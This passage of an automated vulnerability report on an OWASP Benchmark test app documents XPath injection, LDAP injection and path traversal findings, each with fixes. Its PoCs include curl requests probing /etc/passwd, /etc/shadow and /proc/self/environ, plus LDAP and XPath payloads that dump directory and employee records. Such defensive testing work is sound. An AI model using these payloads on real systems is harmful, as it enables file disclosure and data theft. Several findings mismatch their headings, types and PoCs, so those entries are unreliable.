+# 精确 PoC（漏洞代码路径确认后本应可触发，但路由未注册）
+# 请求方法：POST
+# URL：http://127.0.0.1:8443/benchmark/xpathi-00/BenchmarkTest00104
+# Body：BenchmarkTest00104=' or '1'='1
+# 预期响应：返回所有员工信息（盲注探测其他 XPath 表达式也可行）
+# 实际状态：HTTP 405/404（因模块语法错误，路由未注册）
+# 
+# == 代码证据 ==
+# 第31行：param = request.form.get("BenchmarkTest00104")   ← 用户输入源
+# 第40-42行：ConfigParser 存储/读取，无任何净化
+# 第50行：query = f'/Employees/Employee[@emplid=\'{bar}\']'  ← 直接嵌入 XPath
+# 第51行：run_query = lxml.etree.XPath(query)               ← 执行带注入的 XPath
+# 
+# 语法错误位置（第58行，无关漏洞本身）：
+# f'Your XPATH query results are: <br>[ {', '.join(node_strings)} ]'
+# → Python 3.11 不支持 f-string 内使用与外围相同的引号
+```
+
+**修复建议**：1. 修复第58行的 f-string 语法错误（使用变量暂存或改用双引号包裹外层字符串）：`f\"Your XPATH query results are: <br>[ {', '.join(node_strings)} ]\"` 或 `', '.join(node_strings)` 预先赋值给变量
+2. 使用参数化 XPath 查询（lxml.etree.XPath 支持变量绑定）替代字符串拼接，如：
+   ```
+   run_query = lxml.etree.XPath('/Employees/Employee[@emplid=$emplid]')
+   nodes = run_query(root, emplid=bar)
+   ```
+3. 对用户输入进行严格校验，只允许预期的字符模式（如字母数字）
+
+### 2.41 CWE-90 LDAP Injection — testcode/BenchmarkTest00429.py:49
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：疑似(需人工复核)
+
+**① 位置** — sink：`testcode/BenchmarkTest00429.py:49` (函数 `BenchmarkTest00429_post`)
+  · source：`testcode/BenchmarkTest00429.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00429.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00429.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00429.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00429_post@testcode/BenchmarkTest00429.py:28
+
+**④ 验证**：静态判定 `suspected` — 深度核验已实弹尝试但未在步数内下最终结论；据现有进展保守判疑似，附部分证据。
+  · 动态：未复现 — 实弹尝试进行中被步数截断（已保留部分证据，未冷跑旧逻辑）。
+### 2.42 CWE-90 LDAP Injection — testcode/BenchmarkTest00430.py:48
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：疑似(需人工复核)
+
+**① 位置** — sink：`testcode/BenchmarkTest00430.py:48` (函数 `BenchmarkTest00430_post`)
+  · source：`testcode/BenchmarkTest00430.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00430.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00430.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00430.py:48` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00430_post@testcode/BenchmarkTest00430.py:28
+
+**④ 验证**：静态判定 `suspected` — 深度核验已实弹尝试但未在步数内下最终结论；据现有进展保守判疑似，附部分证据。
+  · 动态：未复现 — 实弹尝试进行中被步数截断（已保留部分证据，未冷跑旧逻辑）。
+### 2.43 Path Traversal — testcode/BenchmarkTest00018.py:49
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：疑似(需人工复核)
+
+**① 位置** — sink：`testcode/BenchmarkTest00018.py:49` (函数 `BenchmarkTest00018_post`)
+  · source：`testcode/BenchmarkTest00018.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00018.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00018.py:44` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00018.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00018_post@testcode/BenchmarkTest00018.py:35
+
+**④ 验证**：静态判定 `suspected` — 深度核验已实弹尝试但未在步数内下最终结论；据现有进展保守判疑似，附部分证据。
+  · 动态：未复现 — 实弹尝试进行中被步数截断（已保留部分证据，未冷跑旧逻辑）。
+
+**PoC**：
+```
+Use `../../etc/passwd` (or `..\..\windows\win.ini`); oracle: file contents leaked (e.g. `root:`).
+```
+
+**修复建议**：对文件路径做规范化并限制在受信根目录内（resolve 后校验前缀）；拒绝 `..`/绝对路径；用白名单映射代替直接拼接。
+
+### 2.44 Path Traversal — testcode/BenchmarkTest00019.py:53
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：疑似(需人工复核)
+
+**① 位置** — sink：`testcode/BenchmarkTest00019.py:53` (函数 `BenchmarkTest00019_post`)
+  · source：`testcode/BenchmarkTest00019.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00019.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00019.py:46` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00019.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00019_post@testcode/BenchmarkTest00019.py:35
+
+**④ 验证**：静态判定 `suspected` — 深度核验已实弹尝试但未在步数内下最终结论；据现有进展保守判疑似，附部分证据。
+  · 动态：未复现 — 实弹尝试进行中被步数截断（已保留部分证据，未冷跑旧逻辑）。
+
+**PoC**：
+```
+Use `../../etc/passwd` (or `..\..\windows\win.ini`); oracle: file contents leaked (e.g. `root:`).
+```
+
+**修复建议**：对文件路径做规范化并限制在受信根目录内（resolve 后校验前缀）；拒绝 `..`/绝对路径；用白名单映射代替直接拼接。
+
+### 2.45 Path Traversal — testcode/BenchmarkTest00001.py:47
+
+- **类型**：CWE-22 Path Traversal
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00001.py:47` (函数 `BenchmarkTest00001_post`)
+  · source：`testcode/BenchmarkTest00001.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00001.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00001.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00001.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00001_post@testcode/BenchmarkTest00001.py:35
+
+**④ 验证**：静态判定 `confirmed` — The vulnerability is fully confirmed through both code analysis and live reproduction. The POST handler at /benchmark/pathtraver-00/BenchmarkTest00001 reads user-controlled cookie value 'BenchmarkTest00001' (line 39), directly assigns it to 'bar' without any sanitization (line 41), and concatenates it into a file path used with codecs.open() (line 47). Path traversal payloads like '../../../../etc/passwd' successfully open arbitrary files on the system, with the response confirming file existence vs. non-existence.
+  · 动态：✅ 已复现 — Code analysis:
+- Line 39: `param = urllib.parse.unquote_plus(request.cookies.get("BenchmarkTest00001", "noCookieValueSupplied"))` — cookie value is untrusted user input
+- Line 41: `bar = param` — direct assignment, no sanitization
+- Line 47: `codecs.open(f'{helpers.utils.TESTFILES_DIR}/{bar}','r','utf-8')` — user-controlled value embedded in file path
+
+Runtime reproduction:
+- Cookie: `BenchmarkTest00001=../../../../etc/passwd` → Response: "Access to file: './testfiles/../../../../etc/passwd' created. And file already exists." ✅ (file exists)
+- Cookie: `BenchmarkTest00001=../../../../nonexistent_file_xyz` → Response: "But file doesn't exist yet." ✅ (file doesn't exist)
+
+**PoC**：
+```
+# Step 1: GET request to get the cookie (optional - cookie can be set manually)
+curl -c /tmp/cookies.txt http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001
+
+# Step 2: POST with path traversal payload in cookie
+# Read /etc/passwd (file exists → confirmed)
+curl -X POST http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001 \
+  -b "BenchmarkTest00001=../../../../etc/passwd"
+
+# Response: "Access to file: './testfiles/../../../../etc/passwd' created. And file already exists."
+
+# Probe a non-existent file
+curl -X POST http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001 \
+  -b "BenchmarkTest00001=../../../../nonexistent"
+
+# Response: "But file doesn't exist yet."
+```
+
+**修复建议**：1. Validate and sanitize user input before using it in file path operations. Reject inputs containing path traversal sequences like '../' or '..\\'.
+2. Use os.path.abspath() or os.path.realpath() to resolve the final path and verify it stays within an allowed directory (e.g., testfiles/).
+3. Whitelist allowed filenames instead of accepting arbitrary user input.
+4. Use a secure file access method that prevents directory traversal, such as maintaining a mapping of allowed filenames to actual file paths.
+
+### 2.46 Path Traversal — testcode/BenchmarkTest00002.py:49
+
+- **类型**：CWE-22 Path Traversal
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00002.py:49` (函数 `BenchmarkTest00002_post`)
+  · source：`testcode/BenchmarkTest00002.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00002.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00002.py:44` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00002.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00002_post@testcode/BenchmarkTest00002.py:35
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全确认且动态复现。代码分析显示第39行从Cookie读取不可信输入（urllib.parse.unquote_plus），第43行无条件赋给bar，第49行直接拼接进文件路径 `codecs.open(f'{helpers.utils.TESTFILES_DIR}/{bar}')`。无任何路径净化（无os.path.abspath校验、无'..'过滤、无白名单）。实际POST请求使用 `Cookie: BenchmarkTest00002=../../../etc/passwd` 成功读取到/etc/passwd（返回"file already exists"），而请求不存在的文件返回"file doesn't exist yet"，形成文件存在性Oracle。响应中同时返回了解析后的文件路径，确认路径遍历生效。
+  · 动态：✅ 已复现 — 1. 代码证据：testcode/BenchmarkTest00002.py:49 — `codecs.open(f'{helpers.utils.TESTFILES_DIR}/{bar}','r','utf-8')` 中bar直接来自Cookie且未经任何路径净化
+2. 运行时证据：发送 `Cookie: BenchmarkTest00002=../../../etc/passwd` 返回 "Access to file: './testfiles/../../../etc/passwd' created. And file already exists."；发送不存在的文件路径返回 "But file doesn't exist yet."
+3. 确认可探测任意系统文件的存在性（文件存在性Oracle），并可获取解析后的文件路径
+
+**PoC**：
+```
+# 1. 获取表单（设置初始Cookie，可选步骤）
+curl -k -c /tmp/cookies.txt 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
+
+# 2. 路径遍历 - 检测文件存在性（/etc/passwd）
+curl -k -b 'BenchmarkTest00002=../../../etc/passwd' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
+# 响应: "Access to file: './testfiles/../../../etc/passwd' created. And file already exists."
+
+# 3. 路径遍历 - 检测不存在的文件
+curl -k -b 'BenchmarkTest00002=../../../nonexistent' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
+# 响应: "But file doesn't exist yet."
+
+# 4. 路径遍历 - 读取应用自身源码
+curl -k -b 'BenchmarkTest00002=../testcode/BenchmarkTest00002.py' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
+# 响应: "Access to file: './testfiles/../testcode/BenchmarkTest00002.py' created."
+```
+
+**修复建议**：1. 对用户输入的文件路径进行白名单校验，仅允许预期的文件名/前缀
+2. 使用 os.path.abspath() 将用户输入拼接后的路径解析为绝对路径，并验证其是否在允许的基准目录内（如 os.path.commonpath）
+3. 移除或替换路径中的'..'序列
+4. 使用安全的文件访问 API，如将用户输入映射为预定义的资源标识符而非直接拼接路径
+
+### 2.47 Path Traversal — testcode/BenchmarkTest00003.py:50
+
+- **类型**：CWE-22 Path Traversal
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00003.py:50` (函数 `BenchmarkTest00003_post`)
+  · source：`testcode/BenchmarkTest00003.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00003.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00003.py:44` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00003.py:50` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00003_post@testcode/BenchmarkTest00003.py:35
+
+**④ 验证**：静态判定 `confirmed` — 代码分析 + 实弹复现双重证实：Cookie 中用户可控值通过 ThingFactory（Thing2.doSomething 仅做 ''+x，无任何路径净化）直接拼入 codecs.open() 的文件路径，导致路径遍历。动态请求中发送 ../ 序列成功打开 /etc/passwd（响应"file already exists"），不存在的文件则返回"file doesn't exist yet"，差异化确认存在性探测能力。
+  · 动态：✅ 已复现 — 1) GET /benchmark/pathtraver-00/BenchmarkTest00003 设置 Cookie BenchmarkTest00003=Filename
+2) POST 带 Cookie: BenchmarkTest00003=../../../../etc/passwd → 返回 "Access to file: '.&#x2f;testfiles&#x2f;..&#x2f;..&#x2f;..&#x2f;..&#x2f;etc&#x2f;passwd' created. And file already exists."（路径被 HTML 编码输出 + 确认文件存在）
+3) POST 带 Cookie: BenchmarkTest00003=../../../../etc/nonexistent_file_xyz123 → 返回 "But file doesn't exist yet."（差异化确认）
+
+**PoC**：
+```
+# 步骤1: 获取 Cookie（可选，直接设置 Cookie 头即可）
+curl -k -c /tmp/cookies.txt "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003"
+
+# 步骤2: 发送路径遍历 payload 读取 /etc/passwd（证明文件存在）
+curl -k -X POST \
+  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
+  -H "Cookie: BenchmarkTest00003=../../../../etc/passwd"
+
+# 响应包含 "file already exists" 而非 "file doesn't exist yet"
+
+# 步骤3: 枚举其他系统文件
+curl -k -X POST \
+  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
+  -H "Cookie: BenchmarkTest00003=../../../../etc/shadow"
+
+curl -k -X POST \
+  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
+  -H "Cookie: BenchmarkTest00003=../../.env"
+
+# URL 编码版本也有效（因为 urllib.parse.unquote_plus 会解码）
+curl -k -X POST \
+  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
+  -H "Cookie: BenchmarkTest00003=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+```
+
+**修复建议**：对用户控制的文件路径参数应进行路径规范化与合法性校验：1) 使用 os.path.abspath() 规范化后检查是否在允许的基准目录内；2) 移除或拒绝包含 '../' 或 '..\\' 的输入；3) 使用白名单机制限制可访问的文件名；4) 考虑使用 UUID 或哈希值映射真实文件路径，避免直接暴露文件系统结构。
+
+### 2.48 Path Traversal — testcode/BenchmarkTest00008.py:51
+
+- **类型**：CWE-22 Path Traversal
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00008.py:51` (函数 `BenchmarkTest00008_post`)
+  · source：`testcode/BenchmarkTest00008.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00008.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00008.py:45` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00008.py:51` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00008_post@testcode/BenchmarkTest00008.py:35
+
+**④ 验证**：静态判定 `confirmed` — Path traversal is confirmed through both static code analysis and dynamic runtime reproduction. The code at line 39 reads user-controlled input from cookie 'BenchmarkTest00008', which passes through a condition (line 41-45) that always routes to the else branch (since 'should' IS in "This should never happen"), assigning user input to `bar`. At line 51, `p = testfiles / bar` concatenates the unsanitized user input to the filesystem path. At line 52, `p.exists()` reveals whether the traversed path exists. Multiple payloads were successfully verified at runtime.
+  · 动态：✅ 已复现 — Static: Line 39 reads cookie → Line 45 assigns to bar (condition always goes else) → Line 51 concatenates into path (`p = testfiles / bar`) → Line 52 reveals existence via `p.exists()`. No sanitization or validation is applied to `bar`. Dynamic: POST with `Cookie: BenchmarkTest00008=../../../etc/passwd` returns "File 'testfiles/../../../etc/passwd' exists." confirming traversal to /etc/passwd. POST with `Cookie: BenchmarkTest00008=../../../etc/shadow` confirms /etc/shadow exists. POST with `Cookie: BenchmarkTest00008=../../../proc/self/environ` confirms /proc/self/environ exists.
+
+**PoC**：
+```
+# Step 1: Set the malicious cookie and POST to the endpoint
+curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
+  -H 'Cookie: BenchmarkTest00008=../../../etc/passwd'
+
+# Response: File 'testfiles/../../../etc/passwd' exists.  (confirming /etc/passwd presence)
+
+# Other probes:
+curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
+  -H 'Cookie: BenchmarkTest00008=../../../etc/shadow'
+
+curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
+  -H 'Cookie: BenchmarkTest00008=../../../proc/self/environ'
+
+curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
+  -H 'Cookie: BenchmarkTest00008=../Secretfile'
+```
+
+**修复建议**：1. Validate and sanitize file path components: reject any input containing '../' or absolute path indicators. 2. Use path canonicalization (e.g., pathlib.Path.resolve()) and verify the resolved path stays within the allowed base directory. 3. Implement a whitelist of allowed filenames/files instead of accepting user-controlled path components. 4. Consider using os.path.abspath() combined with a prefix check to ensure the final path starts with the allowed base directory.
+
+### 2.49 CWE-90 LDAP Injection — testcode/BenchmarkTest00266.py:55
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00266.py:55` (函数 `BenchmarkTest00266_post`)
+  · source：`testcode/BenchmarkTest00266.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00266.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00266.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00266.py:55` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00266_post@testcode/BenchmarkTest00266.py:28
+
+**④ 验证**：静态判定 `confirmed` — The code at testcode/BenchmarkTest00266.py:53 directly interpolates user-supplied form parameter `bar` (sourced from `request.form.getlist("BenchmarkTest00266")[0]` at line 31, flowing via case 'A' at line 41) into an LDAP search filter string using an f-string: `f'(&amp;(objectclass=person)(|(uid={bar})(street=The streetz 4 Ms bar)))'`. There is zero sanitization or escaping of LDAP metacharacters before the filter is executed by `conn.search()` at line 56. The LDAP filter injection was dynamically confirmed - empty/normal input returns 1 record (MS Bar by street match), while injection payload `*` as the parameter value returns ALL 3 LDAP directory entries (foo, MS Bar, Mr Unknown), proving unauthorized directory information disclosure.
+  · 动态：✅ 已复现 — 1. SOURCE CODE EVIDENCE: Line 53 directly interpolates `bar` (user input) into LDAP filter via f-string. No escaping function called. 2. DYNAMIC CONFIRMATION: Empty input → "Record found with name MS Bar" (1 entry). Injection `*` → "Record found with name Mr Unknown", "Record found with name MS Bar", "Record found with name foo" (3 entries - all directory entries leaked). Injection `foo)(uid=*` → same 3 entries, demonstrating filter structure manipulation.
+
+**PoC**：
+```
+# Baseline - returns 1 record (MS Bar)
+POST /benchmark/ldapi-00/BenchmarkTest00266
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00266=
+
+# LDAP Injection - returns ALL 3 records (information disclosure)
+POST /benchmark/ldapi-00/BenchmarkTest00266
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00266=*
+
+# Alternative injection - filter manipulation
+POST /benchmark/ldapi-00/BenchmarkTest00266
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00266=foo)(uid=*
+```
+
+**修复建议**：Sanitize/escape LDAP search filter inputs before constructing filter strings. Use ldap3's built-in filter escaping: `from ldap3.utils.conv import escape_filter_chars` then `safe_bar = escape_filter_chars(bar)`. Alternatively, use parameterized/escaped filter construction. Never directly interpolate user input into LDAP filter format strings.
+
+### 2.50 CWE-90 LDAP Injection — testcode/BenchmarkTest00505.py:50
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00505.py:50` (函数 `BenchmarkTest00505_post`)
+  · source：`testcode/BenchmarkTest00505.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00505.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00505.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00505.py:50` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00505_post@testcode/BenchmarkTest00505.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全成立。用户输入从 request.headers['BenchmarkTest00505'] 获取，经简单列表操作后（lst.append(param); lst.pop(0); bar = lst[0]），直接以 f-string 拼接进 LDAP 搜索过滤器 `(&(objectclass=person)(|(uid={bar})(street=The streetz 4 Ms bar)))`，无任何转义或净化。动态测试证实：正常请求返回 1 条记录（MS Bar），而 payload `*` 返回全部 3 条 LDAP 条目（foo、Mr Unknown、MS Bar），证明过滤器被成功篡改。
+  · 动态：✅ 已复现 — 代码层面：testcode/BenchmarkTest00505.py:48 将用户可控的 bar 变量以 f-string 拼接进 LDAP filter，无任何转义。动态复现：请求 header BenchmarkTest00505 设为 `*` 时，LDAP 搜索返回了全部 3 条记录（foo、Mr Unknown、MS Bar），而正常请求仅返回 1 条（MS Bar，符合 street 匹配条件）。这直接证明过滤器中的 uid={bar} 部分被成功操纵，通配符 `*` 匹配了所有 uid。
+
+**PoC**：
+```
+# 基础注入：通配符匹配所有 uid
+curl -H "BenchmarkTest00505: *" http://127.0.0.1:8443/benchmark/ldapi-00/BenchmarkTest00505
+
+# 返回全部3条记录，证明过滤器被操纵
+# 响应示例：
+# LDAP query results:<br>Record found with name foo<br>Address: AddressForFoo #345<br>
+# LDAP query results:<br>Record found with name Mr Unknown<br>Address: Whe home is #678<br>
+# LDAP query results:<br>Record found with name MS Bar<br>Address: The streetz 4 Ms bar<br>
+
+# 正常请求（基准对比）：
+curl http://127.0.0.1:8443/benchmark/ldapi-00/BenchmarkTest00505
+# 仅返回 1 条记录：MS Bar
+```
+
+**修复建议**：使用 ldap3.utils.dn.escape_rdn() 或自定义函数对用户输入进行 LDAP 过滤器转义。对于过滤器中的特殊字符（*、(、)、\、NUL 等），应当进行转义处理。推荐使用 ldap3 库提供的 escape_filter_chars（如适用）或手动替换：str.replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29') 等。绝对不应直接将用户输入拼接到 LDAP 搜索过滤器中。
+
+### 2.51 Path Traversal — testcode/BenchmarkTest00103.py:48
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00103.py:48` (函数 `BenchmarkTest00103_post`)
+  · source：`testcode/BenchmarkTest00103.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00103.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00103.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00103.py:48` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00103_post@testcode/BenchmarkTest00103.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码分析 + 沙箱实弹复现双重确认。污点链清晰：request.form.get('BenchmarkTest00103') (line 31) → Thing2.doSomething() (line 38, 仅做 ''+x 无任何净化) → 直接拼接进 XPath 查询字符串 (line 46) → lxml.etree._Element.xpath(query) 执行 (line 48)。三条 payload 均成功注入并返回越权数据。应用为 OWASP Benchmark，无鉴权，完全公开可访问。
+  · 动态：✅ 已复现 — 【代码证据】testcode/BenchmarkTest00103.py:31 从用户输入获取 param → :38 bar = thing.doSomething(param) (Thing2.doSomething 仅返回 ''+x 无净化) → :46 query = "/Employees/Employee[@emplid='"+bar+"']" → :48 root.xpath(query) 执行未净化的用户输入。【运行时证据】正常请求 '1111' 返回 John Watson；注入 payload "1111'] | //Employee | /Employees/Employee[@emplid='" 返回全部 4 条员工记录（名/姓/年龄/邮箱）；注入 "1111'] | //* | /Employees/Employee[@emplid='" 返回 XML 全部节点内容。三次请求均返回 200，XPath 注入完全成立。
+
+**PoC**：
+```
+# 1. 正常查询
+POST /benchmark/xpathi-00/BenchmarkTest00103
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00103=1111
+
+# Response: 返回 emplid=1111 的 John Watson
+
+# 2. XPath 注入 - 提取所有 Employee 元素
+POST /benchmark/xpathi-00/BenchmarkTest00103
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00103=1111'] | //Employee | /Employees/Employee[@emplid='
+
+# Response: 一次性返回全部4名员工的所有字段（John Watson, Sherlock Homes, Jim Moriarty, Mycroft Holmes）
+
+# 3. XPath 注入 - 提取全部 XML 节点（含文本节点）
+POST /benchmark/xpathi-00/BenchmarkTest00103
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00103=1111'] | //* | /Employees/Employee[@emplid='
+
+# Response: 返回所有 XML 元素的文本内容
+```
+
+**修复建议**：1. 使用参数化 XPath 查询（预编译表达式 + 变量绑定）：lxml.etree.XPath 支持变量绑定，如 root.xpath('/Employees/Employee[@emplid=$eid]', eid=bar)。2. 对用户输入进行严格净化：移除单引号 '、双引号 "、方括号 []、斜杠 / 等 XPath 特殊字符。3. 使用输入白名单验证：只允许字母数字字符和预期格式。4. 最小权限原则：XPath 查询应限制在必要的 XML 子树上。
+
+### 2.52 CWE-90 LDAP Injection — testcode/BenchmarkTest00427.py:49
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
